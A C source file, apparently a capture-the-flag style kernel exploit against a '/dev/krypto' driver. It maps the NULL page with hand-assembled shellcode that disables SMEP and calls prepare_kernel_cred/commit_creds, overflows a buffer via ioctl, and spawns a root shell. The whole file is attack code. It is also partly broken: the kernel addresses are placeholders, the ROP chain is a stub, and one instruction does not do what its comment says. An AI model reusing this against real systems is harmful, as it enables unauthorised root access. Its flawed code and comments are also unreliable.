#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/mman.h>
#include <err.h>
#include <errno.h>

#define KRYPTO_RNG_CMD 0x1337
#define PAGE_SIZE 4096

// Shellcode to disable SMEP and elevate privileges
unsigned char shellcode[] = {
    // Save registers
    0x53,                   // push rbx
    0x50,                   // push rax
    0x51,                   // push rcx
    0x52,                   // push rdx
    0x56,                   // push rsi
    0x57,                   // push rdi

    // Disable SMEP
    0x0f, 0x20, 0xe0,      // mov rax, cr4
    0x48, 0x25, 0xef, 0xff, 0xff, 0xff, // and rax, ~(1<<20)
    0x0f, 0x22, 0xe0,      // mov cr4, rax

    // prepare_kernel_cred(0)
    0x48, 0xc7, 0xc7, 0x00, 0x00, 0x00, 0x00, // mov rdi, 0
    0x48, 0xb8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, // movabs rax, prepare_kernel_cred_addr
    0xff, 0xd0,           // call rax
    0x48, 0x89, 0xc7,     // mov rdi, rax

    // commit_creds()
    0x48, 0xb8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, // movabs rax, commit_creds_addr
    0xff, 0xd0,           // call rax

    // Restore registers
    0x5f,                 // pop rdi
    0x5e,                 // pop rsi
    0x5a,                 // pop rdx
    0x59,                 // pop rcx
    0x58,                 // pop rax
    0x5b,                 // pop rbx

    // Return to userspace
    0x48, 0xb8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, // movabs rax, user_space_addr
    0xff, 0xe0            // jmp rax
};

struct rng_params {
    char *buf;
    size_t buf_len;
};

void map_null_page() {
    char *addr = mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, 
                     MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED) {
        err(1, "Failed to map NULL page");
    }
    memcpy(addr, shellcode, sizeof(shellcode));
}

void setup_payload(char *buf, size_t size) {
    size_t rop_offset = 512; // Adjust based on stack layout
    unsigned long *rop_chain = (unsigned long *)(buf + rop_offset);

    // ROP chain to pivot stack and execute shellcode
    rop_chain[0] = 0x4141414141414141; // Padding
    rop_chain[1] = 0x0;                // Address of shellcode
}

int main() {
    int fd;
    char *overflow_buf;
    struct rng_params params;
    size_t buf_size = 4096;

    // Map NULL page for shellcode
    printf("[+] Mapping NULL page for shellcode...\n");
    map_null_page();

    // Allocate overflow buffer
    overflow_buf = malloc(buf_size);
    if (!overflow_buf) {
        err(1, "Failed to allocate buffer");
    }
    memset(overflow_buf, 'A', buf_size);

    // Setup ROP chain and shellcode trigger
    setup_payload(overflow_buf, buf_size);

    // Open the device
    printf("[+] Opening /dev/krypto...\n");
    fd = open("/dev/krypto", O_RDWR);
    if (fd < 0) {
        err(1, "Failed to open device");
    }

    // Setup overflow parameters
    params.buf = overflow_buf;
    params.buf_len = buf_size;

    // Trigger the overflow
    printf("[+] Triggering overflow...\n");
    if (ioctl(fd, KRYPTO_RNG_CMD, &params) < 0) {
        err(1, "ioctl failed");
    }

    // Check if we got root
    if (getuid() == 0) {
        printf("[+] Got root! Spawning shell...\n");
        system("/bin/sh");
    } else {
        printf("[-] Exploit failed\n");
    }

    close(fd);
    free(overflow_buf);
    return 0;
}

